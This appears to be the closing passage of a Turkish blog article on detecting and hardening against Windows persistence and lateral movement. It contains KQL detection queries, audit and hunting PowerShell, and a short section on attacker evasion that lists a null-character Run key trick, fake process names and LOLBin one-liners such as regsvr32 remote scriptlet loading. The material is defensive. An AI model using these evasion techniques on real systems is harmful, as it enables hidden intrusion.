- **Ağ bağlantıları:** Değişikliği yapan süreç bilinmeyen IP'lere veya alışılmadık portlara trafik üretiyor mu? Bu, C2 kanalının veya veri sızdırmanın işareti olabilir.
- **Dosya ve süreç olayları:** Alarm anında eş zamanlı `Process creation` (EID 1) ve `File creation` (EID 11) olayları, zararlı dosyanın sisteme nasıl girdiğini ve değişikliği hangi ana sürecin yaptığını gösterir.

Bir sürecin `Run` anahtarını değiştirmesi tek başına şüpheli olmayabilir, ancak aynı süreç `C:\Users\Public\` altına yeni bir dosya bırakıp ardından bilinen kötü amaçlı bir IP'ye bağlanıyorsa, bu çoklu olay korelasyonu yanlış pozitifleri azaltırken gerçek tehdidi ortaya çıkarır.

### Pratik SOC Senaryoları — KQL Pseudo-Code

**Senaryo 1: Şüpheli Konumdan Registry Yazma**

```kql
// C:\Users\Public veya C:\ProgramData'dan çalışan bir süreç
// aynı anda Registry Run anahtarını değiştiriyorsa — yüksek öncelikli alarm

SysmonEvent
| where EventID == 13
| where RegistryKey has_any ("\\CurrentVersion\\Run", "\\CurrentVersion\\RunOnce")
| join kind=inner (
    SysmonEvent
    | where EventID == 1
    | where Image has_any (@"C:\Users\Public", @"C:\ProgramData", @"C:\Windows\Temp")
) on $left.ProcessGuid == $right.ProcessGuid
| project TimeGenerated, Image, RegistryKey, RegistryValue, ParentImage
| order by TimeGenerated desc
```

**Senaryo 2: Lateral Movement — WinRM + Yeni Oturum Zinciri**

```kql
// 5985/5986 portuna giden bağlantı + aynı endpoint'te kısa süre içinde
// yeni ağ oturumu (Event ID 4624 Type 3) → potansiyel WinRM lateral movement

SysmonEvent
| where EventID == 3
| where DestinationPort in (5985, 5986)
| join kind=inner (
    SecurityEvent
    | where EventID == 4624
    | where LogonType == 3
) on $left.SourceHostname == $right.WorkstationName
| where datetime_diff('minute', SecurityEvent.TimeGenerated, SysmonEvent.TimeGenerated) < 5
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, AccountName
```

**Senaryo 3: WMI Kalıcılık Tespiti**

```kql
// WMI EventFilter + EventConsumer oluşturma zinciri
// Sysmon EID 19, 20, 21 birlikte tetikleniyorsa kritik alarm

SysmonEvent
| where EventID in (19, 20, 21)
| summarize EventTypes = make_set(EventID), Count = count() by bin(TimeGenerated, 5m), Computer
| where array_length(EventTypes) >= 2  // Birden fazla WMI abonelik bileşeni
| order by TimeGenerated desc
```

**Senaryo 4: Kerberos Anomali — Olağandışı Bilet Talebi**

```kql
// Aynı kullanıcıdan 10 dakika içinde 20'den fazla farklı servise TGS talebi
// → Pass-the-Ticket veya lateral movement göstergesi

SecurityEvent
| where EventID == 4769
| summarize ServiceCount = dcount(ServiceName), TicketCount = count()
    by bin(TimeGenerated, 10m), TargetUserName, IpAddress
| where ServiceCount > 20
| order by TimeGenerated desc
```

### Yanlış Pozitif Yönetimi

Meşru yazılımlar (antivirüs güncellemeleri, kurumsal araçlar) da Run anahtarlarını değiştirebilir. Gürültüyü azaltmak için:

- **Baseline oluşturun:** `Get-PSAutorun` ile sistemin normal otomatik başlatma girdilerini belgeleyin
- **Whitelist:** `C:\Program Files\` ve `C:\Windows\` altından çalışan, imzalı uygulamaları kural dışı bırakın
- **İstisna değil korelasyon:** Tek başına şüpheli olmayan bir olayı diğer olaylarla ilişkilendirin

### Saldırgan Gizlenme Taktikleri

**Null Karakterle Gizleme:**

```
HKCU\Software\...\Run\[NULL]malware_key
```

`Regedit.exe` ve `reg.exe` null karakter sonrasını gösteremez, bu anahtarlar standart araçlardan gizlenir. Sysmon veya gelişmiş EDR zorunludur.

**Sahte Süreç/Dosya Adları:**

- `C:\Windows\System32\svchost32.exe` (meşru: `svchost.exe`)
- `C:\Windows\Temp\WindowsUpdate.exe`

**LOLBins (Living off the Land Binaries):**

Meşru Windows araçlarının kötü amaçlı kullanımı:
- `certutil.exe -decode` → dosya indirme/çözme
- `mshta.exe` → uzak HTA script çalıştırma
- `regsvr32.exe /s /n /u /i:http://...` → COM object üzerinden payload

---

## Sıkılaştırma ve Savunma (Hardening)

### Privileged Access Management (PAM)

PAM, kurumsal ağlarda yüksek ayrıcalıklı erişimleri yönetmek, izlemek ve denetlemek için kullanılan merkezi bir güvenlik çözümüdür.

![Ayrıcalıklı Erişim Yönetimi (PAM) proxy mimarisi ve oturum denetimi](1_4a2mtAcF5OWpT77b-eeS0g.webp)

**PAM'ın Sağladığı Korumalar:**

- **Just-In-Time (JIT) Erişim:** Yönetici hakları yalnızca gerektiğinde ve belirli süre için verilir, süre dolunca otomatik iptal edilir
- **Oturum Kaydı:** Tüm ayrıcalıklı oturumlar video ve log olarak kaydedilir
- **Şifre Kasası:** Yönetici şifreleri PAM tarafından otomatik yönetilir, kullanıcılar şifreyi görmez
- **Çift Onay Mekanizması:** Kritik sistemlere erişim için ikinci bir yöneticinin onayı gerekir

**PAM ve RDP İlişkisi:** Bir PAM çözümü devredeyken RDP oturumları doğrudan değil, PAM proxy'si üzerinden açılır. Bu sayede kimlik bilgileri hedef sistemde hiç görünmez ve tüm oturum kayıt altına alınır.

### Ağ Seviyesinde Kimlik Doğrulama (NLA)

NLA (Network Level Authentication), RDP oturumu kurulmadan önce kimlik doğrulaması yapılmasını zorunlu kılar. Bu, kimlik doğrulanmamış bağlantı isteklerinin sisteme ulaşmasını engeller.

```powershell
# NLA'yı Group Policy veya PowerShell ile etkinleştirme
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
    -Name "UserAuthentication" -Value 1
```

### Çok Faktörlü Kimlik Doğrulama (MFA)

RDP, WinRM ve diğer uzaktan erişim yöntemleri için MFA zorunlu olmalıdır. Kimlik bilgileri ele geçirilse bile ikinci faktör olmadan giriş mümkün olmaz.

- Azure AD / Microsoft Entra ID entegrasyonu
- RADIUS tabanlı MFA çözümleri
- Donanım anahtarları (FIDO2 / YubiKey)

### Least Privilege (En Az Ayrıcalık) Prensibi

Her kullanıcı ve servis hesabı yalnızca görevini yapabilmek için gereken minimum yetkiyle çalışmalıdır.

**Pratik Adımlar:**

```powershell
# Domain Admins grubunu denetle — kim gereksiz yere admin?
Get-ADGroupMember -Identity "Domain Admins" | Select Name, SamAccountName

# Local Admin haklarını kısıtla
# Microsoft LAPS (Local Administrator Password Solution) kullanın:
# Her makinede farklı ve otomatik dönen local admin şifresi
```

- Local Administrator hesabını devre dışı bırakın veya şifreyi LAPS ile yönetin
- Service hesapları için yönetici yetkisi vermeyin
- Domain Admin hesaplarını yalnızca DC üzerinde kullanın

### Ağ Segmentasyonu ve Erişim Kontrolü

```
[İş İstasyonları] --[Firewall]--> [Sunucular] --[Firewall]--> [Domain Controller]
```

- **RDP (3389):** Asla doğrudan internete açmayın, yalnızca VPN, PAM proxy veya Jump Server üzerinden izin verin ve sistemleri BlueKeep gibi açıklara karşı güncel tutun
- **WinRM (5985/5986):** Yönetim ağı segmentiyle sınırlayın
- **SMB (445):** İş istasyonları arası doğrudan SMB trafiğini engelleyin
- **Mikro-segmentasyon:** Host-based firewall kurallarıyla East-West trafiği kısıtlayın

### Audit Politikaları ve Merkezi Log Yönetimi

```powershell
# Kritik audit politikalarını etkinleştir
auditpol /set /subcategory:"Registry" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

- Tüm logları merkezi **SIEM** çözümüne iletIn (Splunk, Microsoft Sentinel, Elastic)
- Log saklama süresi en az **90 gün** (ideal 1 yıl) olmalı
- **Sysmon** yapılandırmasını SwiftOnSecurity veya Olaf Hartong şablonlarıyla dağıtın

### Proaktif Tehdit Avcılığı

Reaktif olmak yetmez. Blue Team düzenli aralıklarla şu kontrolleri yapmalıdır:

```powershell
# Otomatik başlatma noktalarının baseline'ını al
Get-PSAutorun | Export-Csv baseline.csv

# WMI Event aboneliklerini kontrol et
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# IFEO kayıtlarını tara
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" |
    Where-Object { $_.Property -contains "Debugger" } |
    Select-Object PSChildName, @{N='Debugger';E={$_.'Debugger'}}

# Yüklü olmayan DLL'leri tarayan araçlar
# Process Monitor (Procmon) ile "NAME NOT FOUND" DLL aramalarını filtrele
```

#### SOC Analistleri İçin Anahtar Çıkarımlar

- En yaygın `Run` anahtarlarına odaklanın, ancak `Winlogon` ve `Svchost` gibi daha az bilinen anahtarları da göz ardı etmeyin.
- Yalnızca Windows Event Log'larına güvenmeyin, değişikliği yapan ana süreci ve komut satırını gösteren Sysmon gibi zengin telemetri kaynakları kullanın.
- Tek bir log kaydına değil zincire bakın: registry değişikliği → süreç oluşturma → ağ bağlantısı.
- Null karakterle gizlenmiş anahtarlar ve sahte süreç adları gibi gizlenme taktiklerine karşı uyanık olun.
- Avı registry ile sınırlamayın. Zamanlanmış Görevler, WMI abonelikleri ve Windows Hizmetleri de düzenli kontrol edilmelidir.
- Kritik registry anahtarları için denetim politikalarını etkinleştirip logları SIEM'e iletin, ayrıcalıksız kullanıcıların bu anahtarları değiştirmesini En Az Ayrıcalık ilkesiyle kısıtlayın.

---

Bir saldırganın sızma sonrası yolculuğu şu kronolojik zinciri izler:

```
Initial Access → Persistence → Credential Harvesting → Lateral Movement → Privilege Escalation → Objective
```

Bu yazıda her aşamayı hem saldırgan hem de savunmacı perspektifinden inceledik:

- **Persistence:** Kullanıcı manipülasyonu, Scheduled Tasks, Registry Run Keys, BITS Jobs, WMI Event Subscriptions, COM Hijacking, IFEO ve DLL Hijacking
- **Lateral Movement:** RDP, WinRM/PowerShell Remoting, SMB/PsExec ve Kerberos istismarları (PtT, Overpass-the-Hash)
- **Tespit:** Sysmon, Event ID korelasyonu, KQL pseudo-code senaryoları
- **Sıkılaştırma:** PAM, NLA, MFA, Least Privilege, ağ segmentasyonu

> Güvenlik bir ürün değil, süreçtir. Tek bir araç veya kural sizi koruyamaz, katmanlı savunma (Defense in Depth), sürekli izleme ve proaktif tehdit avcılığı bir arada uygulandığında anlamlı koruma sağlanır.

**Daha fazlası için:**
- [MITRE ATT&CK — Persistence (TA0003)](https://attack.mitre.org/tactics/TA0003/)
- [MITRE ATT&CK — Lateral Movement (TA0008)](https://attack.mitre.org/tactics/TA0008/)
